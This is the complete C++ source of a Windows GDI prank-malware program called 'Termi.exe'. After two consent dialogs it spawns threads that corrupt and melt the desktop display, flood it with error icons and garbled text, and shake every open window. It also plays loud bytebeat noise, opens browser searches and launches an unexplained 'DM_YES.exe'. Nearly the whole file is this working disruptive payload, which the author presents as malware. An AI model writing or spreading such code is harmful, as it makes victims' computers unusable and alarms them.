#include <iostream>
#include <Windows.h>
#include <cmath>
#include<tchar.h>
#include<stdio.h>
#pragma comment(lib, "winmm.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) 
#define winapi WINAPI
#define lpvoid LPVOID
#define dword DWORD
#define ulonglong ULONGLONG
#define uint UINT
#define rdtsc __rdtsc

int x = 1920, y = 1080;
auto hdc = GetWindowDC(GetDesktopWindow());
struct tagRECT Rect;
HBRUSH hBrush;
DWORD WINAPI Left(LPVOID lpParam) {
    
    while (1)
    {
        BitBlt(hdc, rand() % 10 - 25, rand() % 25 - 10, x, y, hdc, 0, 0, SRCCOPY);//<--- Effect
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_ERROR));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_WINLOGO));
    }
}

DWORD WINAPI Flashbang(LPVOID lpParam) {

    while (1)
    {
        BitBlt(hdc, 0, 0, x, y, hdc, 0, 0, DSTINVERT);//Flashbang Effect
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_ERROR));
    }
}

DWORD WINAPI  Pixel(LPVOID lpParam) {
    while (1)
    {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 666, rand() % 666, w, h, hdc, rand() % 666, rand() % 666, NOTSRCERASE);//crazy pixel
        Sleep(10);
    }
}
DWORD WINAPI Melt(LPVOID lpParam) {
    //int i = 1; i <= 320
    while (1) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN),
            h = GetSystemMetrics(SM_CYSCREEN),//melt Effect
            rx = rand() % w;
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_WARNING));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_ERROR));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_WINLOGO));
        BitBlt(hdc, rx, 10, 100, h, hdc, rx, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
    }
}

#define M_PI 3.14159265358979323846
DWORD WINAPI Glitch(LPVOID lpParam) {
    FreeConsole();
    DWORD WINAPI screenrotate(LPVOID lpParam); {
        HDC desk = GetDC(0);
        int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        RECT rekt; POINT wPt[3];
        while (1) {
            GetWindowRect(GetDesktopWindow(), &rekt);
            wPt[0].x = rand() % sw; wPt[0].y = rand() % sh;
            wPt[1].x = rand() % sw; wPt[1].y = rand() % sh;
            wPt[2].x = rand() % sw; wPt[2].y = rand() % sh;
            PlgBlt(desk, wPt, desk, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
        }
    }
}

DWORD WINAPI Icons2(LPVOID lpParam) {
    HWND upWnd = GetForegroundWindow();
    HDC upHdc = GetDC(upWnd);
    HDC desk = GetDC(NULL);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int i = 1;
    while (i <= 300) {
        upWnd = GetForegroundWindow();
        upHdc = GetDC(upWnd);
        desk = GetDC(NULL);
        POINT c;
        GetCursorPos(&c);
        BitBlt(desk, -1, 1, sw, sh, desk, 2, 2, NOTSRCCOPY);
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        BitBlt(desk, -rand() % 15, rand() % 15, sw, sh, desk, -rand() % 11, rand() % 11, 0x2837E28);
        DrawIcon(desk, c.x, c.y, LoadIcon(0, IDI_ERROR));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_WARNING));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_ERROR));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_WINLOGO));
        i++;
    }
}

DWORD WINAPI  Textout(LPVOID lpParam) {
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"喵�%Ct1H�喵�114514喵�qʝ��}";
    system("start https://cn.bing.com/search?q=computer%20virus");
    int i = 1;
    while (i <= 320)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
        Sleep(10); i++;
    }
}
DWORD WINAPI Textout2(LPVOID lpParam) {
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"Termi.exe PCを終了しました";
    system("start https://cn.bing.com/search?q=MEMZ");
    int i = 1;
    while (i <= 900)
    {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
        i++;
    }
}
DWORD WINAPI  StartShake(LPVOID lpParam) {
    WinExec("DM_YES.exe", SW_SHOWMAXIMIZED);
    srand((unsigned)time(NULL));
    int sysX, sysY;
    sysX = GetSystemMetrics(SM_CXSCREEN);//get screen width
    sysY = GetSystemMetrics(SM_CYSCREEN);//get screen height
    while (1)
    {
        HWND hWnd = GetDesktopWindow();//get desktop handle
        for (hWnd = GetWindow(hWnd, GW_CHILD); hWnd; hWnd = GetWindow(hWnd, GW_HWNDNEXT))
        {
            RECT rect;

            long style = GetWindowLong(hWnd, GWL_STYLE);//get window type
            if (style & WS_VISIBLE)//window visible
            {
                GetWindowRect(hWnd, &rect);//Get window rectangle coordinates
                int posX, posY, cX, cY;
                bool flag = !(rand() % 2);

                cX = rect.right - rect.left;
                cY = rect.bottom - rect.top;

                //Generate new window coordinates
                if (flag)
                {
                    posX = rect.left + rand() % 20 * 5;
                    posY = rect.top + rand() % 10 * 5;
                }
                else
                {
                    posX = rect.left - rand() % 20 * 5;
                    posY = rect.top - rand() % 10 * 5;
                }

                //border judgment
                if (posX < 0)	posX = 0;
                if (posY < 0)	posY = 0;
                if (posX + cX > sysX)
                    posX = sysX - cX;
                if (posY + cY > sysY)
                    posY = sysY - cY;
                DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_ERROR));
                DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_WINLOGO));
                DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_WARNING));
                //set window position
                SetWindowPos(hWnd, HWND_NOTOPMOST, posX, posY, rect.right - rect.left,
                    rect.bottom - rect.top, SWP_SHOWWINDOW | SWP_NOSIZE | SWP_NOACTIVATE);
            }
        }
        
    }
}
DWORD WINAPI Trash(LPVOID lpParam) {
    while (1)
    {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN),
            h = GetSystemMetrics(SM_CYSCREEN);

        BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, NOTSRCCOPY);
        StretchBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, w, h, SRCCOPY);
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_WINLOGO));
        ReleaseDC(NULL, hdc); 
    }
}
DWORD WINAPI Black(LPVOID lpParam) {
    SetProcessDPIAware();
    int wDest;
    int iVar1;
    HDC hdcDest;
    int hDest;

    wDest = GetSystemMetrics(0);
    iVar1 = GetSystemMetrics(1);
    hdcDest = GetDC((HWND)0x0);
    do {
        do {
            hDest = 0;
        } while (iVar1 < 1);
        do {
            StretchBlt(hdcDest, 0, 0, wDest, hDest, hdcDest, 0, 0, 1, 1, 0x8800c6);
            Sleep(1);
            hDest = hDest + 6;
        } while (hDest < iVar1);
    } while (true);
}
DWORD WINAPI Mlt(LPVOID lpParam) {
    time_t t;
    srand((unsigned)time(&t));
    HDC screenDC = GetDC(NULL);
    int scrWidth = GetDeviceCaps(screenDC, HORZRES);
    int scrHeight = GetDeviceCaps(screenDC, VERTRES);
    int i = 1;
    int x;
    while (1) {
        HDC screenDC = GetDC(NULL);
        x = rand() % scrWidth;
        BitBlt(screenDC, x, 1, 9000, scrHeight, screenDC, x, 0, SRCCOPY);
        Sleep(2); 
    }
}
DWORD WINAPI  PlgBlt(LPVOID lpParam) {
    WinExec("DM_YES.exe", SW_SHOWMAXIMIZED);
    while (1)
    {
        HDC desk;
        RECT wRect;
        POINT wPt[3];
        desk = GetDC(0);
        HDC deskMem = CreateCompatibleDC(desk);
        int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
        HBITMAP screenshot = CreateCompatibleBitmap(desk, xs, ys);
        SelectObject(deskMem, screenshot);
        GetWindowRect(GetDesktopWindow(), &wRect);
        wPt[0].x = wRect.left + 19;
        wPt[0].y = wRect.top - 90;
        wPt[1].x = wRect.right + 10;
        wPt[1].y = wRect.top + 18;
        wPt[2].x = wRect.left - 70;
        wPt[2].y = wRect.bottom - 90;
        PlgBlt(deskMem, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_ERROR));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_WARNING));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_QUESTION));
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_INFORMATION));//Crazy Icon
        DrawIcon(hdc, rand() % x, rand() % y, LoadIcon(nullptr, IDI_WINLOGO));
        BitBlt(desk, 0, 0, xs, ys, deskMem, 0, 0, 0x2837E28);
        DeleteDC(desk);
        DeleteObject(screenshot);
        if (rand() % 10 == 4) InvalidateRect(0, 0, 0);
    }
}
DWORD WINAPI Dmwhile(LPVOID lpParam) {
    HDC dc;
    int i = 1;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x;
    while (i <= 89)//loop 89
    {
        dc = GetDC(0);
        x = rand() % w;
        BitBlt(dc, x, 1, 10, h, dc, x, 0, NOTSRCCOPY);
        Sleep(2);
        i++;
    }
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t ^ t + (t >> 9 | 1) / (t - 12800 ^ t) >> 10));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t > 69));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t ^ t + (t >> 8 | 1) / (t - 12800 ^ t) >> 10));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 80];
    for (DWORD t = 0; t < sizeof(buffer); t++)
        buffer[t] = static_cast<char>("192837350875838589058948945548903458904589034589050890985498034548903589034598045890345903450983450983450983450983450983450983450983450984509835098354098354098345098345098354098345098345098345908345098345983450983450983459083405983459083405983509835098345098345890345890548908904900000000000000002353242342324400000000000000039802382138129372189373981738912732819379837198237129837218937129873289371289371289371289372193721983789237128937219831000000000000000000000000000000000000000000000000030323137231897231879213879231782318732872138732913721387213966666666666666666666666666666666666666666666666666666666699999999999999999999999999999999999999999999999999999996666666666666666666666666666666666669999999999999999999999999666666666666666999999999966666999996696696969696969606948578457897486834763125481693265938569857239857238972398472389472398423498234987234987234789234789324897324879239234987234897387634587632457634576342576435762345823476342978653842654827562439857624587263458976324587962345879634258976324587634576234576547654765476766556534578234978523459623458762354897634259746235879642359876328976523489756389476583724589723465582374965284796523947865943286594598734265863457834658347547823527894564857384564387564387563785678563847563475647675675657546555456475555555555555555555555555555555555555555555555555555555555555555555444444444444455555555555555556666666666666665555555555555555555555555555555555555555555555555555555555555544444444444455555555555555666666666666677777777777898755555555555555555555555555555555555555983742984732984723985555555555555555555555555555555555555554444444444444444444444444444444444444444444444444444444444444444444444444444444444444422222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111222222222222222222222222222222222222222222222222222222222222222222222222222222222222333333333333333333333333333333333333333333333333333344444444444444444444444444444444444555555555555555555566666666666667777777788888998273053487539405743587349587348954759834574893578946736232131253142351243152412534125342312413241323653205213562864761257863415435931784751645617358931571634758765654314743764366158658763174865873145864367134651843765871587173657863476134865341786587413578143657866754767565231465235432645234623467243324573427346536356473574158473582647665451641432564365142136426534254372534675213645231654456132546213546215441365143156341265341356124365142365124365142365142365134612436512346123412535143651243612346512431342513412534153142534253412354153143512435124321315234512352134153412534153415341253421534123123143124312431243243124312431243243124312431231213213213212321232122123212321212121212121222222222121211111111111111111111111111111111111111111100010011111111111111111100000000111101010101010101010100100100000000000100100000000000001"[t >> 5] * t * 33);
    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };//难题
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 13));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 5 | (t >> 2) * (t >> 5));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t >> 6 | t >> 12) & 15 & t >> 9));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

int main()
{
    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
Termi.exe  by  Synth_Cir", L"Termi.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"Termi.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
            HANDLE thread1 = CreateThread(0, 0, Left, 0, 0, 0);
            sound1();
            HANDLE thread2 = CreateThread(0, 0, Flashbang, 0, 0, 0);
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread3 = CreateThread(0, 0, Pixel, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread4 = CreateThread(0, 0, Melt, 0, 0, 0);
            HANDLE thread5 = CreateThread(0, 0, Glitch, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread6 = CreateThread(0, 0, Icons2, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread6, 0);
            CloseHandle(thread6);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread7 = CreateThread(0, 0, Textout, 0, 0, 0);
            HANDLE thread8 = CreateThread(0, 0, StartShake, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread7, 0);
            CloseHandle(thread7);
            InvalidateRect(0, 0, 0);
            TerminateThread(thread8, 0);
            CloseHandle(thread8);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread9 = CreateThread(0, 0, Trash, 0, 0, 0);
            HANDLE thread10 = CreateThread(0, 0, Textout2, 0, 0, 0);
            sound6();
            Sleep(30000);
            TerminateThread(thread9, 0);
            CloseHandle(thread9);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread11 = CreateThread(0, 0, Black, 0, 0, 0);
            HANDLE thread12 = CreateThread(0, 0, PlgBlt, 0, 0, 0);
            HANDLE thread13 = CreateThread(0, 0, Dmwhile, 0, 0, 0);
            sound7();
            Sleep(30000);
        }
    }
}